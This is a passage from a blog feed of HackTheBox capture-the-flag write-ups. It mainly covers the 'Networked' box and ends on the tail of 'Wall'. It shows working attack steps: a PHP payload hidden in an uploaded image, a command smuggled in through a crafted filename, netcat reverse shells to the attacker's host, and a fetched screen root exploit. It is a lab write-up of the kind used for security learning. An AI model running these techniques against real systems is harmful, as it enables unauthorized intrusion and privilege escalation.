...</span><br><span class="line"></span><br><span class="line">www-data@Wall:/tmp$ wget 10.0.0.1:8000/screenroot.sh</span><br><span class="line">2019-10-29 14:59:58 (8.32 MB/s) - ‘screenroot.sh’ saved [1152/1152]</span><br><span class="line">www-data@Wall:/tmp$ bash screenroot.sh</span><br><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)</span></span><br></pre></td></tr></table></figure><p>We got our root shell !</p><p>We skipped the pivot to user part (if there was any) but we can now access easily to both flags:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /home/shelby/user.txt</span></span><br><span class="line">fe6194544f45xxxxx5b12f8da8406</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">1fdbcf8c33exxxxxx2e1b4d5db7</span><br></pre></td></tr></table></figure><p>Later I will give this box another try to pivot correctly to the <code>shelby</code> user if it’s possible and update this writeup.</p><p>EDIT: Here how the pivot was possible : <a href="https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby</a></p><p>As always do not hesitate to contact me for any questions or feedbacks.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gobuster </tag>
            
            <tag> waf </tag>
            
            <tag> wall </tag>
            
            <tag> wfuzz </tag>
            
            <tag> centreon </tag>
            
            <tag> cve-2019-13024 </tag>
            
            <tag> filter </tag>
            
            <tag> screen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Networked</title>
      <link href="/posts/networked/"/>
      <url>/posts/networked/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="networked-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158153-62de5900-9886-11ea-8693-ec973771004c.png"><p>Networked was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.</p><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.146 networked.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Let’s go !</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC networked.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 19:47 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> networked.htb (10.10.10.146)</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">443/tcp closed https</span><br></pre></td></tr></table></figure><p>Seems like we have something super classical: A http (port 80) and SSH (port 22) service open.</p><p>Opening <a href="http://networked.htb" target="_blank" rel="noopener">http://networked.htb</a> display the following message :</p><blockquote><p>Hello mate, we’re building the new FaceMash!<br>Help by funding us and be the new Tyler&amp;Cameron!<br>Join us at the pool party this Sat to get a glimpse</p></blockquote><p>No useful informations in this message. Let’s continue our recon phase with a HTTP enumeration.</p><p>As usual use <code>gobuster</code>. I add the <code>-x php</code> parameter to make sure we get all files with this extension :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://networked.htb -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/backup (Status: 301)</span><br><span class="line">/cgi-bin/ (Status: 403)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/lib.php (Status: 200)</span><br><span class="line">/photos.php (Status: 200)</span><br><span class="line">/upload.php (Status: 200)</span><br><span class="line">/uploads (Status: 301)</span><br></pre></td></tr></table></figure><p>The <code>/backup</code> endpoint is promising. Once opening it we find an archive :</p><p><img src="https://user-images.githubusercontent.com/9076747/67149664-317cbb00-f2ae-11e9-961d-579ad1cdd818.png" alt="Networked backup page"></p><p>Let’s download it and check what’s inside:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://networked.htb/backup/backup.tar</span><br><span class="line">2019-10-19 19:57:46 (65.6 MB/s) - <span class="string">'backup.tar'</span> saved [10240/10240]</span><br><span class="line">[hg8@archbook ~]$ tar -xvf backup.tar</span><br><span class="line">index.php</span><br><span class="line">lib.php</span><br><span class="line">photos.php</span><br><span class="line">upload.php</span><br></pre></td></tr></table></figure><p>It’s a backup of the website. Seems like <code>gobuster</code> did a good job since it already found each of those files.</p><p>Upon investigating the file we find that <code>upload.php</code> is …well… a upload page. It accepts only image and part of the code that check the validity of the sent file is written in <code>lib.php</code> alongside various functions.</p><p><code>photos.php</code> is used to display uploaded images.</p><p>First thing that come to mind here is to try to upload a php webshell through the <code>upload.php</code> page. Let’s check the rules that validate if a file is valid or not :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(check_file_type($_FILES[<span class="string">"myFile"</span>]) &amp;&amp; filesize($_FILES[<span class="string">'myFile'</span>][<span class="string">'tmp_name'</span>]) &lt; <span class="number">60000</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_file_type</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">  $mime_type = file_mime_type($file);</span><br><span class="line">  <span class="keyword">if</span> (strpos($mime_type, <span class="string">'image/'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The first check consist in a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank" rel="noopener">MIME type</a> check of the file. If the file MIME type doesn’t contain <code>image/</code> it will be defined as invalid.</p><p>This check means that the image will be validated locally, so no request edition will help to smuggle a PHP Shell (by editing <code>Content-Type</code> header for example).</p><p>Scrolling through the code we notice a second check :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$validext = <span class="keyword">array</span>(<span class="string">'.jpg'</span>, <span class="string">'.png'</span>, <span class="string">'.gif'</span>, <span class="string">'.jpeg'</span>);</span><br><span class="line">$valid = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($validext <span class="keyword">as</span> $vext) &#123;</span><br><span class="line">  <span class="keyword">if</span> (substr_compare($myFile[<span class="string">"name"</span>], $vext, -strlen($vext)) === <span class="number">0</span>) &#123;</span><br><span class="line">    $valid = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This one check do compare the end of the filename to see if it end with the common <code>.jpg</code>, <code>.png</code>, <code>.gif</code> and <code>.jpeg</code>. If not, the file is defined invalid and not uploaded.</p><p>Alright, with all those information in mind let’s try to craft one malicious image :)</p><h3 id="File-upload-vulnerability"><a href="#File-upload-vulnerability" class="headerlink" title="File upload vulnerability"></a>File upload vulnerability</h3><h4 id="Bypass-First-Check-MIME-Type"><a href="#Bypass-First-Check-MIME-Type" class="headerlink" title="Bypass First Check: MIME Type"></a>Bypass First Check: MIME Type</h4><p>The easiest way to do so is to take a valid image and append the malicious content at the end of the file. It can be done in various way. Here how I did:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="comment"># Download most basic jpg image possible</span></span><br><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/mathiasbynens/small/master/jpeg.jpg -O hg8.jpeg</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo(); ?&gt;"</span> &gt;&gt; hg8.jpeg</span><br><span class="line">[hg8@archbook ~]$ cat hg82.jpeg</span><br><span class="line">����C</span><br><span class="line">��</span><br><span class="line"> ���?�� ��&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h4 id="Bypass-Second-Check-File-extension"><a href="#Bypass-Second-Check-File-extension" class="headerlink" title="Bypass Second Check: File extension**"></a>Bypass Second Check: File extension**</h4><p>A common vulnerability in php file upload form is the “double extension” :</p><blockquote><p>In Apache, a php file might be executed using the double extension technique such as “file.php.jpg.<br><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload" target="_blank" rel="noopener">Unrestricted File Upload</a></p></blockquote><p>And that’s exactly what we are going to do. The second check will pass because our file extension will be <code>.jpg</code> but the php code inside will still get executed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ mv hg8.jpg hg8.php.jpg</span><br></pre></td></tr></table></figure><p>We are ready to upload now! Everything seems to went fine since we get the following message : <code>file uploaded, refresh gallery</code>. The gallery is the <code>photos.php</code> endpoint. Opening this page display a list of recently uploaded files and one with the <code>.php.jpg</code> extension get the attention.</p><p>In the <code>upload.php</code> file we got information about the location of stored images :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">"UPLOAD_DIR"</span>, <span class="string">"/var/www/html/uploads/"</span>);</span><br></pre></td></tr></table></figure><p>We have the location of the upload folder and the name of the file. Let’s open it ! Mine is at <a href="http://networked.htb/uploads/10_10_15_101.php.jpg" target="_blank" rel="noopener">http://networked.htb/uploads/10_10_15_101.php.jpg</a></p><p><img src="https://user-images.githubusercontent.com/9076747/67150075-50318080-f2b3-11e9-8195-26034691deeb.png" alt="Networked upload"></p><h3 id="Pivot-PHP-Webshell-gt-guly"><a href="#Pivot-PHP-Webshell-gt-guly" class="headerlink" title="Pivot PHP Webshell -&gt; guly"></a>Pivot PHP Webshell -&gt; guly</h3><p>Now that we have a working process let’s replace the <code>phpinfo()</code> by a webshell and we can easily land a shell running as <code>apache</code> user :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads $ id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br></pre></td></tr></table></figure><p>The first thing I do after landing a webshell is to check the <code>/etc/password</code> file to find the user we will need to pivot to for finding our flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads $ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">[...]</span><br><span class="line">guly:x:1000:1000:guly:/home/guly:/bin/bash</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Beside <code>root</code> the only user to have a shell setup is <code>guly</code>. It’s our new target ;)</p><p>First we will check if <code>guly</code> have any interesting file in his home folder :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /home/guly</span><br><span class="line">total 16</span><br><span class="line">-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php</span><br><span class="line">-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly</span><br><span class="line">-rw-------  1 guly guly 770 Oct 19 18:28 dead.letter</span><br><span class="line">-r--------. 1 guly guly  33 Oct 30  2018 user.txt</span><br></pre></td></tr></table></figure><p>The flag is indeed there upon various other files.</p><p>We can see two interresting files in <code>guly</code> home foler. A crontab file and a php script :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /home/guly/crontab.guly</span><br><span class="line">*/3 * * * * php /home/guly/check_attack.php</span><br></pre></td></tr></table></figure><p>The cronjob run the <code>check_attack.php</code> script every 3 minutes.</p><p>We don’t have write access to the script so we are not able to edit it to inject command. Since we have read access let’s investigate to see if we can find a vulnerability in the runtime :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br><span class="line">$logpath = <span class="string">'/tmp/attack.log'</span>;</span><br><span class="line">$to = <span class="string">'guly'</span>;</span><br><span class="line">$msg= <span class="string">''</span>;</span><br><span class="line">$headers = <span class="string">"X-Mailer: check_attack.php\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$files = <span class="keyword">array</span>();</span><br><span class="line">$files = preg_grep(<span class="string">'/^([^.])/'</span>, scandir($path));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">[...]</span><br><span class="line">    exec(<span class="string">"rm -f $logpath"</span>);</span><br><span class="line">    exec(<span class="string">"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"rm -f $path$value\n"</span>;</span><br><span class="line">    mail($to, $msg, $msg, $headers, <span class="string">"-F$value"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Three <code>exec</code> calls, we will surely find a way to inject something…</p><p>First exec (<code>exec(&quot;rm -f $logpath&quot;);)</code> can’t do anything since <code>$logpath</code> is harcoded.</p><p>Second exec (<code>exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</code> is already more interesting. Reading thought the code we understand that <code>$value</code> is dynamically fetched from the filenames of files present in the <code>/var/www/html/uploads/</code> folder.</p><p>For example with our previously uploaded image file (<code>hg8.php.jpg</code>) the executed command will be :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"nohup /bin/rm -f /var/www/html/uploads/hg8.php.jpg &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br></pre></td></tr></table></figure><p>So if we are a file named, for example, <code>; sleep 5 ;</code> here is what the executed command will be:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"nohup /bin/rm -f /var/www/html/uploads/; sleep 5 ; &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br></pre></td></tr></table></figure><p>Since we have write access to the <code>/var/www/html/uploads/</code> folder let’s try it out with a reverse shell.</p><p>Firstly let’s open our listener :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br></pre></td></tr></table></figure><p>And let’s create our ‘malicious’ file :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads$ touch <span class="string">"; nc 10.10.10.10 8544 -c bash ;"</span></span><br></pre></td></tr></table></figure><p>We wait a little bit for the cronjob to run and surely a new connection open on our listener :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br><span class="line">Connection from 10.10.10.146:52024</span><br><span class="line">[guly@networked ~]$ id</span><br><span class="line">uid=1000(guly) gid=1000(guly) groups=1000(guly)</span><br><span class="line">[guly@networked ~]$ cat user.txt</span><br><span class="line">526cxxxxxxxxxxx1c5</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"</span> -O lse.sh</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">[guly@networked]$ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh</span><br><span class="line">2019-10-17 08:00:49 (527 KB/s) - <span class="string">'/tmp/lse.sh'</span> saved [31736/31736]</span><br></pre></td></tr></table></figure><p>Let’s run the script to see if we can find anything intesrresting :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ bash /tmp/lse.sh</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">===================================================================( sudo )=====</span><br><span class="line">[!] sud000 Can we sudo without a password?................................. nope</span><br><span class="line">[!] sud010 Can we list sudo commands without a password?................... yes!</span><br><span class="line">---</span><br><span class="line">User guly may run the following commands on networked:</span><br><span class="line">    (root) NOPASSWD: /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">==================================( FINISHED )==================================</span><br></pre></td></tr></table></figure><p>We notice a very interesting configuration here. The script <code>/usr/local/sbin/changename.sh</code> can be run as <code>root</code> without password through sudo. If we can edit or find a flaw in this script it will be our pass to the root flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked tmp]$ ls -l /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">-rwxr-xr-x 1 root root 422 Jul  8 12:34 /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br></pre></td></tr></table></figure><p>Without surprise we can not write in the file. Let’s investigate to check if we can find a flow in it’s working.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ cat /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line">cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF</span><br><span class="line">DEVICE=guly0</span><br><span class="line">ONBOOT=no</span><br><span class="line">NM_CONTROLLED=no</span><br><span class="line">EoF</span><br><span class="line"></span><br><span class="line">regexp=<span class="string">"^[a-zA-Z0-9_\ /-]+$"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">    <span class="built_in">read</span> x</span><br><span class="line">    <span class="keyword">while</span> [[ ! <span class="variable">$x</span> =~ <span class="variable">$regexp</span> ]]; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"wrong input, try again"</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">        <span class="built_in">read</span> x</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$var</span>=<span class="variable">$x</span> &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/sbin/ifup guly0</span><br></pre></td></tr></table></figure><p>The script take various user input to set them in a network configuration file <code>/etc/sysconfig/network-scripts/ifcfg-guly</code>. At the end the <code>/sbin/ifup guly0</code> apply the new configuration.</p><h3 id="network-script-privilege-escalation"><a href="#network-script-privilege-escalation" class="headerlink" title="network-script privilege escalation"></a>network-script privilege escalation</h3><p>This one was new for me, while searching for informations about <code>network-script</code> I stumbled across this <code>SecList</code>:</p><blockquote><p>Redhat/CentOS root through network-scripts<br>If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can<br>adjust an existing one, then your system in pwned.<br>In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in<br>the name the system tries to execute the part after the white/blank space. Which means; everything after the first<br>blank space is executed as root.</p><p>For example:</p><p>/etc/sysconfig/network-scripts/ifcfg-1337</p><p>NAME=Network /bin/id  &lt;= Note the blank space<br>ONBOOT=yes<br>DEVICE=eth0</p><p>Yes, any script in that folder is executed by root because of the sourcing technique.</p><p><a href="https://seclists.org/fulldisclosure/2019/Apr/24" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Apr/24</a></p></blockquote><p>Sounds exactly what we need since the <code>changename.sh</code> script edit the <code>NAME</code> value with user input string. And now I understand why the <code>Networked</code> name was chosen.</p><p>Let’s give it a try. First we open a new listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8599</span><br><span class="line">Listening on any address 8599</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ sudo /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">nc -e /bin/sh 10.10.10.10 8599</span><br><span class="line">wrong input, try again</span><br><span class="line">interface NAME:</span><br><span class="line">^C</span><br></pre></td></tr></table></figure><p>Alright, that couldn’t be that easy… The input is filtered. The rule is the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp=<span class="string">"^[a-zA-Z0-9_\ /-]+$"</span></span><br></pre></td></tr></table></figure><p>This regex doesn’t seems that bad, we can still use <code>_</code>, spaces, <code>/</code> and <code>-</code>. To be honest at this point it gets really easy to overthink the solution which is quite simple in the end.</p><p>Call to an external script should perfectly work:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ <span class="built_in">echo</span> <span class="string">"nc -e /bin/sh 10.10.10.10 8599"</span> &gt; /tmp/hg8</span><br><span class="line">[guly@networked]$ chmod +x /tmp/hg8</span><br><span class="line">[guly@networked tmp]$ sudo /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">/bin/bash /tmp/hg8</span><br><span class="line">interface PROXY_METHOD:</span><br><span class="line">hg8</span><br><span class="line">interface BROWSER_ONLY:</span><br><span class="line">hg8</span><br><span class="line">interface BOOTPROTO:</span><br><span class="line">hg8</span><br></pre></td></tr></table></figure><p>And bingo, a connection open on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8599</span><br><span class="line">Listening on any address 8599</span><br><span class="line">Connection from 10.10.10.146:46502</span><br><span class="line">[root@networked ~]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">[root@networked ~]<span class="comment"># cat /root.txt</span></span><br><span class="line">0a8ecxxxxxxxxxxxxxcb82</span><br></pre></td></tr></table></figure><p>I had a lot of fun with this box and learned a few new things. I hope this writeup could help you too.</p><p>As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> upload </tag>
            
            <tag> webshell </tag>
            
            <tag> sudo </tag>
            
            <tag> gobuster </tag>
            
            <tag> command-injection </tag>
            
            <tag> networked </tag>
            
            <tag> php </tag>
            
            <tag> weevely </tag>
            
            <tag> filtering </tag>
            
            <tag> ifcfg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Jarvis</title>
      <link href="/posts/jarvis/"/>
      <url>/posts/jarvis/</url>
      
